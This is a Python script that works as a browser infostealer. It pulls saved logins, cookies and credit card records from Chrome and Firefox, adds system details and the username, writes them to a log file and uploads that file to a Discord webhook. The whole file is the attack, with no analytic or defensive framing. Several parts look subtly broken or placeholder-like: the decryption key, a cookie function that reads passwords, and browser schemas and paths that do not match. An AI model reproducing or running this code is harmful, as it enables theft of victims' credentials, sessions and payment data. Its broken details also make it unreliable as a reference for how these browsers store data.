import os
import json
import requests
import base64
import psutil
import platform
import getpass
import sqlite3
from Crypto.Cipher import AES
from base64 import b64decode

def decrypt_chrome_password(encrypted_password, key):
    """Decrypt Chrome passwords using pycryptodome."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv=b' ' * 16)
        decrypted = cipher.decrypt(encrypted_password)
        return decrypted.rstrip(b'\x00').decode()
    except Exception as e:
        return f"Error decrypting password: {str(e)}"

def get_chrome_cookies():
    data_path = os.path.expanduser('~/.config/google-chrome/Default')
    login_db = os.path.join(data_path, 'Login Data')

    if not os.path.exists(login_db):
        print(f"Database file not found: {login_db}")
        return []

    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    r = [{'url': item[0], 'username': item[1], 'password': decrypt_chrome_password(base64.b64decode(item[2]), b'key_for_aes_decryption')} for item in cursor.fetchall()]
    conn.close()
    return r

def get_chrome_passwords():
    data_path = os.path.expanduser('~/.config/google-chrome/Default')
    login_db = os.path.join(data_path, 'Login Data')

    if not os.path.exists(login_db):
        print(f"Database file not found: {login_db}")
        return []

    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    r = [{'url': item[0], 'username': item[1], 'password': decrypt_chrome_password(base64.b64decode(item[2]), b'key_for_aes_decryption')} for item in cursor.fetchall()]
    conn.close()
    return r

def get_chrome_cards():
    text = r"""
    SELECT 
    c.issuerName,
    c.cardNumber,
    c.expireMonth,
    c.expireYear
    FROM autofillProfileNames as n
    INNER JOIN creditCards as c ON n.guid = c.guid
    """
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Web Data")
    if not os.path.exists(path):
        print(f"Database file not found: {path}")
        return []

    c = sqlite3.connect(path)
    cur = c.cursor()
    r = cur.execute(text).fetchall()
    c.close()
    return r

def get_firefox_cookies():
    text = r"""
    SELECT c.name, c.value, h.title, h.url
    FROM moz_cookies c
    JOIN moz_hosts h ON c.host = h.host
    """
    path = os.path.expanduser("~/.mozilla/firefox")
    for i in os.listdir(path):
        if i.endswith(".default"):
            c = sqlite3.connect(os.path.join(path, i, "cookies.sqlite"))
            cur = c.cursor()
            r = cur.execute(text).fetchall()
            c.close()
            return r

def get_firefox_passwords():
    path = os.path.expanduser("~/.mozilla/firefox")
    for i in os.listdir(path):
        if i.endswith(".default"):
            with open(os.path.join(path, i, "logins.json"), 'r') as file:
                r = json.load(file)
            return r

def get_firefox_cards():
    text = r"""
    SELECT cardNumber, expMonth, expYear
    FROM moz_credit_cards
    """
    path = os.path.expanduser("~/.mozilla/firefox")
    for i in os.listdir(path):
        if i.endswith(".default"):
            c = sqlite3.connect(os.path.join(path, i, "formhistory.sqlite"))
            cur = c.cursor()
            r = cur.execute(text).fetchall()
            c.close()
            return r

def get_info():
    info = {}
    info['platform'] = platform.system()
    info['platform-release'] = platform.release()
    info['platform-version'] = platform.version()
    info['architecture'] = platform.machine()
    info['processor'] = platform.processor()
    info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
    info['username'] = getpass.getuser()
    return info

def get_browsers():
    browsers = {}
    browsers['chrome'] = {}
    browsers['chrome']['cookies'] = get_chrome_cookies()
    browsers['chrome']['passwords'] = get_chrome_passwords()
    browsers['chrome']['cards'] = get_chrome_cards()
    browsers['firefox'] = {}
    browsers['firefox']['cookies'] = get_firefox_cookies()
    browsers['firefox']['passwords'] = get_firefox_passwords()
    browsers['firefox']['cards'] = get_firefox_cards()
    return browsers

def save_data_to_file(data, file_path):
    """Save collected data to a file."""
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

def send_file_to_discord_webhook(webhook_url, file_path):
    """Send a file to the specified Discord webhook URL."""
    with open(file_path, 'rb') as file:
        files = {'file': (file_path, file)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("File sent successfully!")
        else:
            print("Failed to send file. Status code:", response.status_code)

def main():
    webhook_url = input("Enter your Discord webhook URL: ")
    info = get_info()
    browsers = get_browsers()
    data = {
        'info': info,
        'browsers': browsers
    }
    file_path = 'log.txt'
    save_data_to_file(data, file_path)
    send_file_to_discord_webhook(webhook_url, file_path)

if __name__ == "__main__":
    main()
